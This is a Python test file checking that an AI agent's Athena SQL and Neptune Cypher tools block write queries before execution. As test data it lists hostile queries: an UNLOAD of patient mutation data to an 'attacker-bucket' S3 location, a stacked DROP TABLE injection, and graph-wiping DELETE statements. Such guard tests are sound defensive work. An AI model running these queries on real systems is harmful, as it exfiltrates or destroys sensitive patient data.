"""T2: the deployed agent's and the eval harness's SQL/Cypher tools must reject writes in-process.

The read-only guards (hub_core.guards) must run on every agent tool path — query_knowledge_graph and
_run_athena (query_patient_data / query_variant_annotation / query_primekg) — and on the
evaluation/hub_tools.py @tool wrappers, BEFORE the executor is called. SEMHUB_STRIP_GUARDS=1 is a
prompt-only experiment toggle and must NOT switch these guards off.

Executors are mocked; no AWS calls. Agent tests skip if strands/bedrock_agentcore are absent.
"""
import importlib
import os
import sys
import unittest
from pathlib import Path
from unittest import mock

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))
sys.path.insert(0, str(_ROOT / "agentcore"))

REJECTED = "Rejected (read-only endpoint):"

BAD_SQL = [
    "UNLOAD (SELECT * FROM tcga_mutations) TO 's3://attacker-bucket/x/' WITH (format='PARQUET')",
    "INSERT INTO tcga_mutations VALUES (1)",
    "CREATE TABLE stolen AS SELECT * FROM tcga_mutations",
    "SELECT 1; DROP TABLE tcga_mutations",
    "WITH x AS (SELECT 1) UNLOAD (SELECT * FROM x) TO 's3://b/'",
]
BAD_CYPHER = [
    "CREATE (n:gene_protein {name:'FAKE'})",
    "MATCH (n) DETACH DELETE n",
    "MATCH (g:gene_protein) SET g.cosmic_tier = 9",
    "CALL neptune.load({format:'csv', source:'s3://b/k', region:'us-west-2'})",
    "CALL neptune.algo.pageRank.mutate({writeProperty:'pr'}) YIELD success RETURN success",
]
GOOD_SQL = "SELECT count(DISTINCT case_id) FROM tcga_mutations WHERE project_id='TCGA-GBM'"
GOOD_CYPHER = "MATCH (g:gene_protein {name:'EGFR'})-[:drug_protein]-(d:drug) RETURN count(DISTINCT d)"


def _agent_deps():
    try:
        import strands  # noqa: F401
        import bedrock_agentcore  # noqa: F401
        return True
    except Exception:
        return False


def _load_agent(layer, strip=False):
    env = {"SEMHUB_LAYER": layer, "AWS_DEFAULT_REGION": "us-west-2"}
    if strip:
        env["SEMHUB_STRIP_GUARDS"] = "1"
    with mock.patch.dict(os.environ, env):
        if not strip:
            os.environ.pop("SEMHUB_STRIP_GUARDS", None)
        sys.modules.pop("semantic_hub_agent", None)
        return importlib.import_module("semantic_hub_agent")


# (layer, tool attribute names that run SQL, whether the graph tool is present)
_LAYERS = {
    "L1": (["query_patient_data"], False),
    "L2": (["query_patient_data", "query_variant_annotation", "query_primekg"], False),
    "L3": (["query_patient_data", "query_variant_annotation"], True),
}


@unittest.skipUnless(_agent_deps(), "strands/bedrock_agentcore not installed — run in the repo .venv")
class TestAgentReadOnlyGuards(unittest.TestCase):

    def tearDown(self):
        sys.modules.pop("semantic_hub_agent", None)

    def _check_layer(self, layer, strip):
        mod = _load_agent(layer, strip=strip)
        tool_names = {getattr(t, "tool_name", None) for t in mod._TOOLS}
        sql_tools, has_graph = _LAYERS[layer]
        with mock.patch.object(mod._q, "run_athena_sql", return_value="ATHENA_OK") as ath, \
                mock.patch.object(mod._q, "run_opencypher", return_value="GRAPH_OK") as nep:
            for name in sql_tools:
                self.assertIn(name, tool_names)
                tool = getattr(mod, name)
                for q in BAD_SQL:
                    with self.subTest(layer=layer, strip=strip, tool=name, q=q):
                        self.assertTrue(tool(q).startswith(REJECTED))
                ath.assert_not_called()
                self.assertEqual(tool(GOOD_SQL), "ATHENA_OK")
                ath.reset_mock()
            if has_graph:
                self.assertIn("query_knowledge_graph", tool_names)
                for q in BAD_CYPHER:
                    with self.subTest(layer=layer, strip=strip, tool="query_knowledge_graph", q=q):
                        self.assertTrue(mod.query_knowledge_graph(q).startswith(REJECTED))
                nep.assert_not_called()
                self.assertEqual(mod.query_knowledge_graph(GOOD_CYPHER), "GRAPH_OK")
                nep.assert_called_once()

    def test_layers_reject_writes(self):
        for layer in _LAYERS:
            self._check_layer(layer, strip=False)

    def test_strip_guards_does_not_disable_code_guards(self):
        # Sanity: the toggle is actually active (prompt text stripped) while code guards still hold.
        self.assertNotIn("Citation discipline:", _load_agent("L3", strip=True).SYSTEM_PROMPT)
        self.assertIn("Citation discipline:", _load_agent("L3", strip=False).SYSTEM_PROMPT)
        for layer in _LAYERS:
            self._check_layer(layer, strip=True)

    def test_run_athena_shim_rejects_before_executor(self):
        mod = _load_agent("L3")
        with mock.patch.object(mod._q, "run_athena_sql") as ath:
            self.assertTrue(mod._run_athena("VACUUM t", mod.ATHENA_DATABASE).startswith(REJECTED))
            ath.assert_not_called()


def _eval_deps():
    try:
        import strands  # noqa: F401
        return True
    except Exception:
        return False


@unittest.skipUnless(_eval_deps(), "strands not installed — run in the repo .venv")
class TestEvalHubToolsReadOnlyGuards(unittest.TestCase):

    def setUp(self):
        with mock.patch.dict(os.environ, {"AWS_DEFAULT_REGION": "us-west-2"}):
            self.ht = importlib.import_module("evaluation.hub_tools")

    def test_sql_tool_rejects_writes(self):
        with mock.patch.object(self.ht, "_athena") as ath:
            for q in BAD_SQL:
                with self.subTest(q=q):
                    self.assertTrue(self.ht.query_patient_data(q).startswith(REJECTED))
            ath.start_query_execution.assert_not_called()

    def test_cypher_tool_rejects_writes(self):
        with mock.patch.object(self.ht, "_neptune") as nep:
            for q in BAD_CYPHER:
                with self.subTest(q=q):
                    self.assertTrue(self.ht.query_knowledge_graph(q).startswith(REJECTED))
            nep.execute_query.assert_not_called()

    def test_reads_pass_through(self):
        with mock.patch.object(self.ht, "run_sql", return_value=[["n"], ["7"]]) as rs, \
                mock.patch.object(self.ht, "run_cypher", return_value=[{"n": 3}]) as rc:
            self.assertIn('"7"', self.ht.query_patient_data(GOOD_SQL))
            self.assertIn('"n": 3', self.ht.query_knowledge_graph(GOOD_CYPHER))
            rs.assert_called_once_with(GOOD_SQL)
            rc.assert_called_once_with(GOOD_CYPHER)


if __name__ == "__main__":
    unittest.main()
